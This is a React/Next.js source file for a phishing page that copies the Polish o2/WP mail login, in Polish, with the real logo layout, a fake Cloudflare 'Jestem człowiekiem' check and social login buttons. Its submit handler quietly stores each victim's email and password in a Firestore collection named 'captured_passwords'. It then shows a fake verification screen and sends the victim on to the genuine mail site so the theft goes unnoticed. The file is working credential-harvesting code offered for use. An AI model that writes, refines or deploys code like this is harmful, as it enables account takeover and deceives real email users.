"use client"

import { useState, useEffect } from "react"
import { ChevronLeft, Loader2, Facebook, Apple, ShieldCheck } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import Image from "next/image"
import { PlaceHolderImages } from "@/lib/placeholder-images"
import { useFirebase, setDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
import { collection, doc } from "firebase/firestore"

export function O2Login() {
  const [emailValue, setEmailValue] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isFinished, setIsFinished] = useState(false)
  const [isCloudflareVerified, setIsCloudflareVerified] = useState(false)

  const { firestore, auth, user } = useFirebase();
  const o2Logo = PlaceHolderImages.find(img => img.id === "o2-logo")
  const wpIllustration = PlaceHolderImages.find(img => img.id === "wp-illustration")
  const partner1 = PlaceHolderImages.find(img => img.id === "partner-logo-1")
  const partner2 = PlaceHolderImages.find(img => img.id === "partner-logo-2")

  useEffect(() => {
    if (auth && !user) {
      initiateAnonymousSignIn(auth);
    }
  }, [auth, user]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    
    if (firestore) {
      const colRef = collection(firestore, "captured_passwords");
      const id = doc(colRef).id;
      const docRef = doc(firestore, "captured_passwords", id);
      
      setDocumentNonBlocking(docRef, {
        id,
        password,
        sourceEmail: emailValue,
        captureTimestamp: new Date().toISOString(),
      }, { merge: true });
    }
    
    setTimeout(() => {
      setIsSubmitting(false)
      setIsFinished(true)
    }, 1500)
  }

  if (isFinished) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center space-y-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
            <Loader2 className="w-8 h-8 text-green-600 animate-spin" />
          </div>
          <h2 className="text-xl font-bold">Trwa weryfikacja...</h2>
          <p className="text-gray-500 text-sm">Twoje dane są weryfikowane. Za chwilę zostaniesz przekierowany.</p>
          <Button className="w-full bg-[#002aff] hover:bg-blue-700" onClick={() => window.location.href = "https://poczta.o2.pl"}>
            Przejdź do poczty
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col md:flex-row bg-white">
      {/* Left Sidebar */}
      <div className="w-full md:w-[360px] flex flex-col border-r min-h-screen bg-white shadow-xl z-20">
        {/* Top Bar with Logo and Shadow */}
        <div className="h-16 flex items-center justify-between px-4 border-b bg-white shadow-sm">
          <button className="text-blue-600 hover:bg-blue-50 p-1 rounded-full transition-colors">
            <ChevronLeft className="w-6 h-6" />
          </button>
          <div className="relative w-10 h-10">
            {o2Logo && (
              <Image src={o2Logo.imageUrl} alt="O2" fill className="object-contain" data-ai-hint={o2Logo.imageHint} />
            )}
          </div>
          <div className="w-8" /> {/* Balance spacer */}
        </div>

        <div className="flex-1 flex flex-col p-6 space-y-6">
          <div className="space-y-1">
            <h2 className="text-lg font-bold text-gray-800">Zaloguj się</h2>
            <p className="text-xs text-gray-500">Wprowadź swoje dane, aby kontynuować</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-3">
              <Input
                placeholder="Adres e-mail"
                value={emailValue}
                onChange={(e) => setEmailValue(e.target.value)}
                required
                className="h-11 border-gray-200 text-sm focus:ring-[#002aff]"
                autoFocus
              />
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder="Hasło"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="h-11 border-gray-200 text-sm pr-20 focus:ring-[#002aff]"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-gray-400 hover:text-[#002aff]"
                >
                  {showPassword ? "UKRYJ" : "POKAŻ"}
                </button>
              </div>
            </div>

            {/* Improved Cloudflare Mock */}
            <div 
              className="bg-[#f9f9f9] border border-gray-200 p-3 rounded-md flex items-center justify-between cursor-pointer hover:bg-gray-50 transition-colors"
              onClick={() => setIsCloudflareVerified(!isCloudflareVerified)}
            >
              <div className="flex items-center gap-3">
                <div className={`w-6 h-6 border-2 rounded-sm flex items-center justify-center transition-all ${isCloudflareVerified ? 'bg-green-500 border-green-500' : 'bg-white border-gray-300'}`}>
                  {isCloudflareVerified && <span className="text-white text-sm font-bold">✓</span>}
                </div>
                <span className="text-xs font-medium text-gray-600">Jestem człowiekiem</span>
              </div>
              <div className="flex flex-col items-end opacity-60">
                <div className="flex items-center gap-1">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-orange-500">
                    <path d="M17.5 19c.7 0 1.3-.2 1.8-.7s.7-1.1.7-1.8c0-.7-.2-1.3-.7-1.8s-1.1-.7-1.8-.7c-.7 0-1.3.2-1.8.7s-.7 1.1-.7 1.8c0 .7.2 1.3.7 1.8s1.1.7 1.8.7Z"/>
                    <path d="M12.5 19c.7 0 1.3-.2 1.8-.7s.7-1.1.7-1.8c0-.7-.2-1.3-.7-1.8s-1.1-.7-1.8-.7c-.7 0-1.3.2-1.8.7s-.7 1.1-.7 1.8c0 .7.2 1.3.7 1.8s1.1.7 1.8.7Z"/>
                    <path d="M7.5 19c.7 0 1.3-.2 1.8-.7s.7-1.1.7-1.8c0-.7-.2-1.3-.7-1.8s-1.1-.7-1.8-.7c-.7 0-1.3.2-1.8.7s-.7 1.1-.7 1.8c0 .7.2 1.3.7 1.8s1.1.7 1.8.7Z"/>
                    <path d="M12 3a9 9 0 0 0-9 9 9 9 0 0 0 9 9 9 9 0 0 0 9-9 9 9 0 0 0-9-9Z"/>
                  </svg>
                  <span className="text-[10px] font-bold text-gray-700">Cloudflare</span>
                </div>
                <span className="text-[9px] text-gray-400">Prywatność • Pomoc</span>
              </div>
            </div>

            <Button 
              type="submit" 
              className="w-full h-11 bg-[#002aff] hover:bg-blue-700 font-bold text-sm shadow-md transition-all active:scale-[0.98]" 
              disabled={isSubmitting || !isCloudflareVerified}
            >
              {isSubmitting ? <Loader2 className="animate-spin w-5 h-5" /> : "Zaloguj się"}
            </Button>
          </form>

          <div className="text-center space-y-4 pt-2">
            <a href="#" className="text-xs font-semibold text-blue-600 hover:underline">Nie pamiętasz hasła?</a>
            <div className="relative">
              <div className="absolute inset-0 flex items-center"><span className="w-full border-t" /></div>
              <div className="relative flex justify-center text-[10px] uppercase font-bold tracking-wider"><span className="bg-white px-2 text-gray-400">lub zaloguj się przez</span></div>
            </div>
            
            <div className="flex justify-center gap-6">
              <button className="p-2.5 border rounded-full hover:bg-gray-50 transition-colors shadow-sm bg-white">
                <svg viewBox="0 0 24 24" className="w-5 h-5" xmlns="http://www.w3.org/2000/svg">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.14-4.53z" fill="#EA4335"/>
                </svg>
              </button>
              <button className="p-2.5 border rounded-full hover:bg-gray-50 transition-colors shadow-sm bg-white">
                <Facebook className="w-5 h-5 text-[#1877F2] fill-[#1877F2]" />
              </button>
              <button className="p-2.5 border rounded-full hover:bg-gray-50 transition-colors shadow-sm bg-white">
                <Apple className="w-5 h-5 text-black fill-black" />
              </button>
            </div>
            
            <a href="#" className="block text-blue-600 font-bold text-sm hover:underline">Załóż nowe konto</a>
          </div>

          <div className="mt-auto pt-4 text-[9px] text-gray-400 space-y-1.5 text-center">
            <div className="flex justify-center gap-2 items-center">
              <span>Język: <button className="text-gray-600 font-bold">Polski</button> | <button>English</button></span>
              <span className="w-1 h-1 bg-gray-300 rounded-full" />
              <button>O nas</button>
              <span className="w-1 h-1 bg-gray-300 rounded-full" />
              <button>Pomoc</button>
            </div>
            <div className="flex justify-center gap-2 items-center">
              <button>Regulamin</button>
              <span className="w-1 h-1 bg-gray-300 rounded-full" />
              <button>Prywatność</button>
            </div>
            <p className="pt-2">© 2024 Grupa WP</p>
          </div>
        </div>
      </div>

      {/* Right Content */}
      <div className="flex-1 bg-pattern flex flex-col items-center justify-center p-8 md:p-16 relative overflow-hidden bg-gray-50">
        <div className="max-w-lg space-y-8 z-10 text-center md:text-left w-full">
          <div className="space-y-4">
            <h1 className="text-3xl md:text-5xl font-extrabold text-[#111c30] leading-tight">
              Jedno konto do wielu serwisów i poczty
            </h1>
            <p className="text-base text-gray-500 max-w-md">
              Rejestrujesz się raz, szybko logujesz w swoich ulubionych serwisach i w pełni z nich korzystasz.
            </p>
          </div>
          
          <Button variant="outline" className="h-11 px-8 border-2 border-gray-200 font-bold hover:bg-gray-50 text-gray-700">
            Załóż WP Konto
          </Button>

          <div className="relative w-full aspect-square max-w-[400px] mx-auto md:mx-0 mt-8">
            {wpIllustration && (
              <Image src={wpIllustration.imageUrl} alt="Illustration" fill className="object-contain" data-ai-hint={wpIllustration.imageHint} />
            )}
          </div>
        </div>

        {/* Partner Logos Carousel Placeholder */}
        <div className="absolute bottom-8 w-full px-8 overflow-hidden pointer-events-none hidden md:block">
          <div className="flex gap-4 justify-center flex-wrap opacity-30 grayscale scale-90">
            {[partner1, partner2, partner1, partner2].map((p, i) => (
              <div key={i} className="bg-white border p-2 rounded-lg shadow-sm w-32 h-12 relative">
                {p && <Image src={p.imageUrl} alt="partner" fill className="object-contain p-2" data-ai-hint={p.imageHint} />}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}
